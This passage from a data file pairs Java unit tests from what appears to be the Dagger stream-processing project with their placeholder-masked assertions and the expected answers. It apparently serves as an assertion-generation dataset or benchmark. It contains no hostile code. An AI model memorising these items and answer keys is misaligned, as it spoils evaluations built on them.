canDecorate() { return pgSourceConfig != null; }"	assertTrue(pgStreamDecorator.canDecorate())
"cannotDecorateStreamWhenConfigIsNull() { PgStreamDecorator pgStreamDecorator = new PgStreamDecorator(null, externalMetricConfig, schemaConfig);  ""<AssertPlaceHolder>""; }
canDecorate() { return pgSourceConfig != null; }"	assertFalse(pgStreamDecorator.canDecorate())
"canDecorateWhenInternalConfigIsPresent() { columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalDecorator internalDecorator = new InternalDecorator(mock(InternalSourceConfig.class), null, columnNameManager);  ""<AssertPlaceHolder>""; }
canDecorate() { return internalSourceConfig != null; }"	assertTrue(internalDecorator.canDecorate())
"canNotDecorateWhenInternalConfigIsNotPresent() { columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalDecorator internalDecorator = new InternalDecorator(null, null, null);  ""<AssertPlaceHolder>""; }
canDecorate() { return internalSourceConfig != null; }"	assertFalse(internalDecorator.canDecorate())
"shouldUpdateRowWhenOutputRowSizeIsNotEqualToColumnSize() { columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList(""output1"", ""output2"")); Row dataStreamRow = new Row(2); dataStreamRow.setField(1, new Row(1)); InternalConfigProcessor processorMock = mock(InternalConfigProcessor.class); InternalDecorator internalDecorator = new InternalDecorator(null, processorMock, columnNameManager);  internalDecorator.map(dataStreamRow); Row outputRow = (Row) dataStreamRow.getField(1);  ""<AssertPlaceHolder>""; verify(processorMock).process(new RowManager(dataStreamRow)); }
map(Row input) { Row outputRow = (Row) input.getField(OUTPUT_ROW_INDEX); if (outputColumnSizeIsDifferent(outputRow)) { input.setField(OUTPUT_ROW_INDEX, new Row(columnNameManager.getOutputSize())); } RowManager rowManager = new RowManager(input); internalConfigProcessor.process(rowManager); return rowManager.getAll(); }"	assertEquals(2, outputRow.getArity())
"canProcessWhenInternalConfigIsPresent() { InternalPostProcessor internalPostProcessor = new InternalPostProcessor(null, null);  PostProcessorConfig mockConfig = mock(PostProcessorConfig.class); when(mockConfig.hasInternalSource()).thenReturn(true); ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig config) { return config.hasInternalSource(); }"	assertTrue(internalPostProcessor.canProcess(mockConfig))
"canNotProcessWhenInternalConfigIsNull() { InternalPostProcessor internalPostProcessor = new InternalPostProcessor(null, null);  PostProcessorConfig mockConfig = mock(PostProcessorConfig.class); when(mockConfig.hasInternalSource()).thenReturn(false); ""<AssertPlaceHolder>""; }
canProcess(PostProcessorConfig config) { return config.hasInternalSource(); }"	assertFalse(internalPostProcessor.canProcess(mockConfig))
"processWithRightConfiguration() { ExternalSourceConfig externalSource = new ExternalSourceConfig(new ArrayList<>(), new ArrayList<>(), new ArrayList<>(), new ArrayList<>()); ArrayList<TransformConfig> transformers = new ArrayList<>(); ArrayList<InternalSourceConfig> internalSourceConfigs = new ArrayList<>(); internalSourceConfigs.add(new InternalSourceConfig(""output"", ""order_id"", ""sql"", null)); PostProcessorConfig postProcessorConfig = new PostProcessorConfig(externalSource, transformers, internalSourceConfigs); InternalPostProcessor internalPostProcessor = new InternalPostProcessor(postProcessorConfig, null);  StreamInfo streamInfoMock = mock(StreamInfo.class); DataStream resultStream = mock(DataStream.class); when(streamInfoMock.getColumnNames()).thenReturn(new String[] {""order_id"", ""customer_id""}); when(streamInfoMock.getDataStream()).thenReturn(resultStream);  StreamInfo process = internalPostProcessor.process(streamInfoMock); verify(resultStream, times(1)).map(any(InternalDecorator.class)); ""<AssertPlaceHolder>""; }
process(StreamInfo streamInfo) { DataStream<Row> resultStream = streamInfo.getDataStream(); ColumnNameManager columnNameManager = new ColumnNameManager(streamInfo.getColumnNames(), postProcessorConfig.getOutputColumnNames());  for (InternalSourceConfig internalSourceConfig : postProcessorConfig.getInternalSource()) { resultStream = enrichStream(resultStream, internalSourceConfig, getInternalDecorator(internalSourceConfig, columnNameManager)); } return new StreamInfo(resultStream, columnNameManager.getOutputColumnNames()); }"	"assertArrayEquals(new String[] {""output""}, process.getColumnNames())"
"getMandatoryFieldsTest() { InternalSourceConfig config = new InternalSourceConfig(""outputField1"", ""value1"", ""eurekatype"", null); HashMap<String, Object> mandatoryFields = config.getMandatoryFields(); Map<String, Object> expectedObjectMap = new HashMap<String, Object>() {{ put(""output_field"", ""outputField1""); put(""value"", ""value1""); put(""type"", ""eurekatype""); }};  ""<AssertPlaceHolder>""; }
getMandatoryFields() { HashMap<String, Object> mandatoryFields = new HashMap<>(); mandatoryFields.put(""output_field"", outputField); mandatoryFields.put(""type"", type); mandatoryFields.put(""value"", value);  return mandatoryFields; }"	assertEquals(expectedObjectMap, mandatoryFields)
"getTypeTest() { InternalSourceConfig config = new InternalSourceConfig(""outputField1"", ""value1"", ""eurekatype"", null); ""<AssertPlaceHolder>""; }
getType() { return type; }"	"assertEquals(""eurekatype"", config.getType())"
"getOutputFieldTest() { InternalSourceConfig config = new InternalSourceConfig(""outputField1"", ""value1"", ""eurekatype"", null); ""<AssertPlaceHolder>""; }
getOutputField() { return outputField; }"	"assertEquals(""outputField1"", config.getOutputField())"
"getValueTest() { InternalSourceConfig config = new InternalSourceConfig(""outputField1"", ""value1"", ""eurekatype"", null); ""<AssertPlaceHolder>""; }
getValue() { return value; }"	"assertEquals(""value1"", config.getValue())"
"getInternalProcessorConfigTest() { Map<String, String> internalProcessorConfig = new HashMap<String, String>(); internalProcessorConfig.put(""foo"", ""bar"");  InternalSourceConfig config = new InternalSourceConfig(""outputField1"", ""value1"", ""eurekatype"", internalProcessorConfig); ""<AssertPlaceHolder>""; }
getInternalProcessorConfig() { return internalProcessorConfig; }"	assertEquals(internalProcessorConfig, config.getInternalProcessorConfig())
"shouldProcessToPopulateDataAtRightIndexForRightConfiguration() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{""input1"", ""input2""}, Arrays.asList(""output1"", ""output2"", ""output3"")); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""output3"", ""testValue"", ""constant"", null); ConstantInternalConfigProcessor constantConfigProcessor = new ConstantInternalConfigProcessor(columnNameManager, internalSourceConfig); Row inputRow = new Row(2); Row outputRow = new Row(3); Row parentRow = new Row(2); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow); RowManager rowManager = new RowManager(parentRow);  constantConfigProcessor.process(rowManager);  ""<AssertPlaceHolder>""; }
process(RowManager rowManager) { int outputFieldIndex = columnNameManager.getOutputIndex(internalSourceConfig.getOutputField()); if (outputFieldIndex != -1) { rowManager.setInOutput(outputFieldIndex, internalSourceConfig.getValue()); } }"	"assertEquals(""testValue"", rowManager.getOutputData().getField(2))"
"shouldGetCurrentTimeFunctionProcessor() { InternalSourceConfig internalSourceConfig = mock(InternalSourceConfig.class); when(internalSourceConfig.getValue()).thenReturn(""CURRENT_TIMESTAMP"");  FunctionProcessor functionProcessor = FunctionProcessorFactory.getFunctionProcessor(internalSourceConfig, null);  ""<AssertPlaceHolder>""; }
getFunctionProcessor(InternalSourceConfig internalSourceConfig, SchemaConfig schemaConfig) { return getFunctions(internalSourceConfig, schemaConfig) .stream() .filter(functionProcessor -> functionProcessor.canProcess(internalSourceConfig.getValue())) .findFirst() .orElse(new InvalidFunction(internalSourceConfig)); }"	assertEquals(CurrentTimestampFunction.class, functionProcessor.getClass())
"shouldGetJSONPayloadFunctionProcessor() { InternalSourceConfig internalSourceConfig = mock(InternalSourceConfig.class); when(internalSourceConfig.getValue()).thenReturn(""JSON_PAYLOAD"");  FunctionProcessor functionProcessor = FunctionProcessorFactory.getFunctionProcessor(internalSourceConfig, null);  ""<AssertPlaceHolder>""; }
getFunctionProcessor(InternalSourceConfig internalSourceConfig, SchemaConfig schemaConfig) { return getFunctions(internalSourceConfig, schemaConfig) .stream() .filter(functionProcessor -> functionProcessor.canProcess(internalSourceConfig.getValue())) .findFirst() .orElse(new InvalidFunction(internalSourceConfig)); }"	assertEquals(JsonPayloadFunction.class, functionProcessor.getClass())
"shouldGetInvalidFunctionProcessor() { InternalSourceConfig internalSourceConfig = mock(InternalSourceConfig.class); when(internalSourceConfig.getValue()).thenReturn(""UNNEST"");  FunctionProcessor functionProcessor = FunctionProcessorFactory.getFunctionProcessor(internalSourceConfig, null);  ""<AssertPlaceHolder>""; }
getFunctionProcessor(InternalSourceConfig internalSourceConfig, SchemaConfig schemaConfig) { return getFunctions(internalSourceConfig, schemaConfig) .stream() .filter(functionProcessor -> functionProcessor.canProcess(internalSourceConfig.getValue())) .findFirst() .orElse(new InvalidFunction(internalSourceConfig)); }"	assertEquals(InvalidFunction.class, functionProcessor.getClass())
"canNotProcessWhenFunctionNameIsNull() { CurrentTimestampFunction currentTimestampFunction = new CurrentTimestampFunction(null); ""<AssertPlaceHolder>""; }
canProcess(String functionName) { return CURRENT_TIMESTAMP_FUNCTION_KEY.equals(functionName); }"	assertFalse(currentTimestampFunction.canProcess(null))
"shouldGetCurrentTimestampAsResult() { long currentTimestampMs = System.currentTimeMillis(); Clock clock = mock(Clock.class); when(clock.millis()).thenReturn(currentTimestampMs);  CurrentTimestampFunction currentTimestampFunction = new CurrentTimestampFunction(clock);  Timestamp expectedCurrentTimestamp = new Timestamp(currentTimestampMs); Timestamp actualCurrentTimestamp = (Timestamp) currentTimestampFunction.getResult(null);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { return new Timestamp(clock.millis()); }"	assertEquals(expectedCurrentTimestamp, actualCurrentTimestamp)
"canNotProcessWhenFunctionNameIsNull() { InvalidFunction invalidFunction = new InvalidFunction(null); ""<AssertPlaceHolder>""; }
canProcess(String functionName) { return false; }"	assertFalse(invalidFunction.canProcess(null))
"shouldGetJsonPayloadAsResult() { JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(commonInternalSourceConfig, commonSchemaConfig);  String expectedJsonPayload = ""{""service_type"":""UNKNOWN"",""order_number"":"""",""order_url"":"""",""status"":""UNKNOWN"",""event_timestamp"":{""seconds"":0,""nanos"":0},""customer_id"":"""",""customer_url"":"""",""driver_id"":"""",""driver_url"":"""",""activity_source"":"""",""service_area_id"":"""",""amount_paid_by_cash"":0.0,""driver_pickup_location"":{""name"":"""",""address"":"""",""latitude"":0.0,""longitude"":0.0,""type"":"""",""note"":"""",""place_id"":"""",""accuracy_meter"":0.0,""gate_id"":""""},""driver_dropoff_location"":{""name"":"""",""address"":"""",""latitude"":0.0,""longitude"":0.0,""type"":"""",""note"":"""",""place_id"":"""",""accuracy_meter"":0.0,""gate_id"":""""},""customer_email"":"""",""customer_name"":"""",""customer_phone"":"""",""driver_email"":"""",""driver_name"":"""",""driver_phone"":"""",""cancel_reason_id"":0,""cancel_reason_description"":"""",""booking_creation_time"":{""seconds"":0,""nanos"":0},""total_customer_discount"":0.0,""gopay_customer_discount"":0.0,""voucher_customer_discount"":0.0,""pickup_time"":{""seconds"":0,""nanos"":0},""driver_paid_in_cash"":0.0,""driver_paid_in_credit"":0.0,""vehicle_type"":""UNKNOWN"",""customer_total_fare_without_surge"":0,""customer_dynamic_surge_enabled"":false,""driver_total_fare_without_surge"":0,""driver_dynamic_surge_enabled"":false,""meta_array"":[],""profile_data"":null,""event_properties"":null,""key_values"":null,""cash_amount"":0.0,""int_array_field"":[],""metadata"":[],""payment_option_metadata"":{""masked_card"":"""",""network"":""""},""test_enums"":[],""routes"":[],""customer_price"":0.0,""boolean_array_field"":[],""double_array_field"":[],""float_array_field"":[],""long_array_field"":[]}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(commonRowManager); ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestMessage""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestMessage.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(commonMessage.getDescriptor(), commonMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""order_number"":""order-number-123"",""order_url"":""https://order-url"",""order_details"":""pickup""}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestNestedMessage""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestNestedMessage.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  TestNestedMessage nestedMessage = TestNestedMessage.newBuilder() .setNestedId(""id-123"") .setSingleMessage(commonMessage) .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(nestedMessage.getDescriptor(), nestedMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""nested_id"":""id-123"",""single_message"":{""order_number"":""order-number-123"",""order_url"":""https://order-url"",""order_details"":""pickup""}}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestNestedRepeatedMessage""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestNestedRepeatedMessage.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  TestNestedRepeatedMessage nestedRepeatedMessage = TestNestedRepeatedMessage.newBuilder() .addRepeatedMessage(commonMessage) .addRepeatedMessage(commonMessage) .addRepeatedNumberField(1) .addRepeatedNumberField(2) .setNumberField(10) .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(nestedRepeatedMessage.getDescriptor(), nestedRepeatedMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""single_message"":{""order_number"":"""",""order_url"":"""",""order_details"":""""},""repeated_message"":[{""order_number"":""order-number-123"",""order_url"":""https://order-url"",""order_details"":""pickup""},{""order_number"":""order-number-123"",""order_url"":""https://order-url"",""order_details"":""pickup""}],""number_field"":10,""repeated_number_field"":[1,2],""metadata"":null,""event_timestamp"":{""seconds"":0,""nanos"":0},""repeated_long_field"":[]}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestMapMessage""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestMapMessage.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  TestMapMessage mapMessage = TestMapMessage.newBuilder() .putCurrentState(""foo"", ""bar"") .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(mapMessage.getDescriptor(), mapMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""order_number"":"""",""current_state"":[{""key"":""foo"",""value"":""bar""}]}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestRepeatedEnumMessage""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestRepeatedEnumMessage.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  TestRepeatedEnumMessage repeatedEnumMessage = TestRepeatedEnumMessage.newBuilder() .addTestEnumsValue(0) .addTestEnumsValue(0) .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(repeatedEnumMessage.getDescriptor(), repeatedEnumMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""test_enums"":[""UNKNOWN"",""UNKNOWN""]}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"InvalidProtocolBufferException { String protoClass = ""org.raystack.dagger.consumer.TestComplexMap""; InternalSourceConfig internalSourceConfig = getInternalSourceConfigForProtoClass(protoClass); SchemaConfig schemaConfig = getSchemaConfigForProtoAndDescriptor(protoClass, TestComplexMap.getDescriptor());  JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(internalSourceConfig, schemaConfig);  TestComplexMap complexMapMessage = TestComplexMap.newBuilder() .putComplexMap(1, commonMessage) .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(complexMapMessage.getDescriptor(), complexMapMessage.toByteArray()); RowManager rowManager = getRowManagerForMessage(dynamicMessage);  String expectedJsonPayload = ""{""complex_map"":[{""key"":1,""value"":{""order_number"":""order-number-123"",""order_url"":""https://order-url"",""order_details"":""pickup""}}],""int_message"":[],""string_message"":[]}""; String actualJsonPayload = (String) jsonPayloadFunction.getResult(rowManager);  ""<AssertPlaceHolder>""; }
getResult(RowManager rowManager) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSerializationSchema(); } return new String(jsonRowSerializationSchema.serialize(rowManager.getInputData())); }"	assertEquals(expectedJsonPayload, actualJsonPayload)
"canNotProcessWhenFunctionNameIsNull() { JsonPayloadFunction jsonPayloadFunction = new JsonPayloadFunction(commonInternalSourceConfig, commonSchemaConfig); ""<AssertPlaceHolder>""; }
canProcess(String functionName) { return JSON_PAYLOAD_FUNCTION_KEY.equals(functionName); }"	assertFalse(jsonPayloadFunction.canProcess(null))
"canNotProcessWhenTypeIsNull() { InvalidInternalConfigProcessor invalidInternalConfigProcessor = new InvalidInternalConfigProcessor(null);  ""<AssertPlaceHolder>""; }
canProcess(String type) { return false; }"	assertFalse(invalidInternalConfigProcessor.canProcess(null))
"shouldReturnAllOfTheInputData() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""all"", ""*"", ""sql"", null); SqlConfigTypePathParser sqlConfigTypePathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager);  Row inputRow = new Row(2); inputRow.setField(0, ""input1""); inputRow.setField(1, ""input2""); Row outputRow = new Row(3); Row parentRow = new Row(2); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow); RowManager rowManager = new RowManager(parentRow);  Object data = sqlConfigTypePathParser.getData(rowManager); ""<AssertPlaceHolder>""; }
getData(RowManager rowManager) { String inputField = internalSourceConfig.getValue(); if (Constants.SQL_PATH_SELECT_ALL_CONFIG_VALUE.equals(inputField)) { return rowManager.getInputData(); } int inputFieldIndex = columnNameManager.getInputIndex(inputField); if (inputFieldIndex == -1) { throw new InvalidConfigurationException(String.format(""Value '%s' in input field for sql is wrongly configured"", inputField)); } return rowManager.getFromInput(inputFieldIndex); }"	"assertEquals(Row.of(""input1"", ""input2""), data)"
"shouldReturnTheInputDataAsPerTheConfiguration() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{""input1"", ""input2""}, Arrays.asList(""output1"", ""output2"", ""output3"")); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""field"", ""input2"", ""sql"", null); SqlConfigTypePathParser sqlConfigTypePathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager);  Row inputRow = new Row(2); inputRow.setField(0, ""inputData1""); inputRow.setField(1, ""inputData2""); Row outputRow = new Row(3); Row parentRow = new Row(2); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow); RowManager rowManager = new RowManager(parentRow);  Object data = sqlConfigTypePathParser.getData(rowManager);  ""<AssertPlaceHolder>""; }
getData(RowManager rowManager) { String inputField = internalSourceConfig.getValue(); if (Constants.SQL_PATH_SELECT_ALL_CONFIG_VALUE.equals(inputField)) { return rowManager.getInputData(); } int inputFieldIndex = columnNameManager.getInputIndex(inputField); if (inputFieldIndex == -1) { throw new InvalidConfigurationException(String.format(""Value '%s' in input field for sql is wrongly configured"", inputField)); } return rowManager.getFromInput(inputFieldIndex); }"	"assertEquals(""inputData2"", data)"
"shouldBeAbleToProcessSqlCustomType() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""field"", ""value"", ""sql"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager); SqlInternalConfigProcessor sqlInternalConfigProcessor = new SqlInternalConfigProcessor(columnNameManager, sqlPathParser, internalSourceConfig);  ""<AssertPlaceHolder>""; }
canProcess(String type) { return SQL_CONFIG_HANDLER_TYPE.equals(type); }"	assertTrue(sqlInternalConfigProcessor.canProcess(internalSourceConfig.getType()))
"shouldNotBeAbleToProcessFunctionCustomType() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""field"", ""value"", ""function"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager); SqlInternalConfigProcessor sqlInternalConfigProcessor = new SqlInternalConfigProcessor(columnNameManager, sqlPathParser, internalSourceConfig);  ""<AssertPlaceHolder>""; }
canProcess(String type) { return SQL_CONFIG_HANDLER_TYPE.equals(type); }"	assertFalse(sqlInternalConfigProcessor.canProcess(internalSourceConfig.getType()))
"shouldNotBeAbleToProcessConstantCustomType() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""field"", ""value"", ""constant"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager); SqlInternalConfigProcessor sqlInternalConfigProcessor = new SqlInternalConfigProcessor(columnNameManager, sqlPathParser, internalSourceConfig);  ""<AssertPlaceHolder>""; }
canProcess(String type) { return SQL_CONFIG_HANDLER_TYPE.equals(type); }"	assertFalse(sqlInternalConfigProcessor.canProcess(internalSourceConfig.getType()))
"shouldReturnSqlInternalAutoFieldImportClass() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""*"", ""*"", ""sql"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager);  SqlInternalFieldFactory sqlInternalFieldFactory = new SqlInternalFieldFactory(columnNameManager, sqlPathParser, internalSourceConfig); SqlInternalFieldConfig sqlInternalFieldConfig = sqlInternalFieldFactory.getSqlInternalFieldConfig();  ""<AssertPlaceHolder>""; }
getSqlInternalFieldConfig() { if (selectAllFromInputColumns()) { return new SqlInternalAutoFieldImport(columnNameManager); } else { return new SqlInternalFieldImport(columnNameManager, sqlPathParser, internalSourceConfig); } }"	assertEquals(SqlInternalAutoFieldImport.class, sqlInternalFieldConfig.getClass())
"shouldReturnSqlInternalFieldImportClass() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{}, Arrays.asList()); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""output_field"", ""value"", ""sql"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager);  SqlInternalFieldFactory sqlInternalFieldFactory = new SqlInternalFieldFactory(columnNameManager, sqlPathParser, internalSourceConfig); SqlInternalFieldConfig sqlInternalFieldConfig = sqlInternalFieldFactory.getSqlInternalFieldConfig();  ""<AssertPlaceHolder>""; }
getSqlInternalFieldConfig() { if (selectAllFromInputColumns()) { return new SqlInternalAutoFieldImport(columnNameManager); } else { return new SqlInternalFieldImport(columnNameManager, sqlPathParser, internalSourceConfig); } }"	assertEquals(SqlInternalFieldImport.class, sqlInternalFieldConfig.getClass())
"shouldProcessToPopulateDataAtRightIndexForRightConfiguration() { ColumnNameManager columnNameManager = new ColumnNameManager(new String[]{""inputField""}, Arrays.asList(""output1"", ""outputField"", ""output2"")); InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""outputField"", ""inputField"", ""sql"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, columnNameManager); SqlInternalFieldImport sqlInternalFieldImport = new SqlInternalFieldImport(columnNameManager, sqlPathParser, internalSourceConfig);  Row inputRow = new Row(1); inputRow.setField(0, ""inputValue1""); Row outputRow = new Row(3); Row parentRow = new Row(2); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow); RowManager rowManager = new RowManager(parentRow);  sqlInternalFieldImport.processInputColumns(rowManager);  ""<AssertPlaceHolder>""; }
processInputColumns(RowManager rowManager) { int outputFieldIndex = columnNameManager.getOutputIndex(internalSourceConfig.getOutputField()); if (outputFieldIndex != -1) { Object inputData = sqlPathParser.getData(rowManager); rowManager.setInOutput(outputFieldIndex, inputData); } }"	"assertEquals(""inputValue1"", rowManager.getOutputData().getField(1))"
"shouldReturnNullIfOutputIndexIsNotFoundInOutputColumnManager() { InternalSourceConfig internalSourceConfig = new InternalSourceConfig(""outputField"", ""inputField"", ""sql"", null); SqlConfigTypePathParser sqlPathParser = new SqlConfigTypePathParser(internalSourceConfig, defaultColumnNameManager); SqlInternalFieldImport sqlInternalFieldImport = new SqlInternalFieldImport(defaultColumnNameManager, sqlPathParser, internalSourceConfig);  Row inputRow = new Row(1); inputRow.setField(0, ""inputValue1""); Row outputRow = new Row(3); Row parentRow = new Row(2); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow); RowManager rowManager = new RowManager(parentRow);  when(defaultColumnNameManager.getOutputIndex(""field"")).thenReturn(-1); sqlInternalFieldImport.processInputColumns(rowManager);  ""<AssertPlaceHolder>""; }
processInputColumns(RowManager rowManager) { int outputFieldIndex = columnNameManager.getOutputIndex(internalSourceConfig.getOutputField()); if (outputFieldIndex != -1) { Object inputData = sqlPathParser.getData(rowManager); rowManager.setInOutput(outputFieldIndex, inputData); } }"	assertNull(rowManager.getOutputData().getField(1))
"shouldReturnLongbowProcessorWithWriteOnly() { String[] inputColumnNames = new String[]{""longbow_write_key"", ""longbow_write"", ""rowtime"", ""event_timestamp""}; when(streamInfo.getColumnNames()).thenReturn(inputColumnNames); when(configuration.getString(INPUT_STREAMS, """")).thenReturn(""[{""INPUT_SCHEMA_PROTO_CLASS"": ""InputProtoMessage""}]""); LongbowSchema longbowSchema = new LongbowSchema(inputColumnNames); LongbowFactory longbowFactory = new LongbowFactory(longbowSchema, configuration, stencilClientOrchestrator, metricsTelemetryExporter, asyncProcessor); PostProcessor longbowProcessor = longbowFactory.getLongbowProcessor(); StreamInfo outputStream = longbowProcessor.process(streamInfo); verify(asyncProcessor, times(1)).orderedWait(eq(dataStream), any(LongbowWriter.class), anyLong(), any(TimeUnit.class), anyInt()); String[] expectedColumnNames = {""longbow_write_key"", ""longbow_write"", ""rowtime"", ""event_timestamp"", ""bigtable_table_id"", ""input_class_name"", ""longbow_read_key""}; ""<AssertPlaceHolder>""; }
getLongbowProcessor() { LongbowReader longbowReader; LongbowWriter longbowWriter; LongbowValidator longbowValidator = new LongbowValidator(columnNames); LongbowType longbowType = longbowSchema.getType();  ArrayList<RichAsyncFunction<Row, Row>> longbowRichFunctions = new ArrayList<>(); longbowValidator.validateLongbow(longbowType); switch (longbowType) { case LongbowWrite: longbowWriter = longbowWriterPlus(); longbowRichFunctions.add(longbowWriter); longbowWriter.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowWriteColumnModifier()); case LongbowRead: longbowReader = longbowReaderPlus(); longbowRichFunctions.add(longbowReader); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new LongbowReadColumnModifier()); default: longbowWriter = longbowWriter(); longbowReader = longbowReader(); longbowRichFunctions.add(longbowWriter); longbowRichFunctions.add(longbowReader); longbowWriter.notifySubscriber(metricsTelemetryExporter); longbowReader.notifySubscriber(metricsTelemetryExporter); return new LongbowProcessor(asyncProcessor, configuration, longbowRichFunctions, new 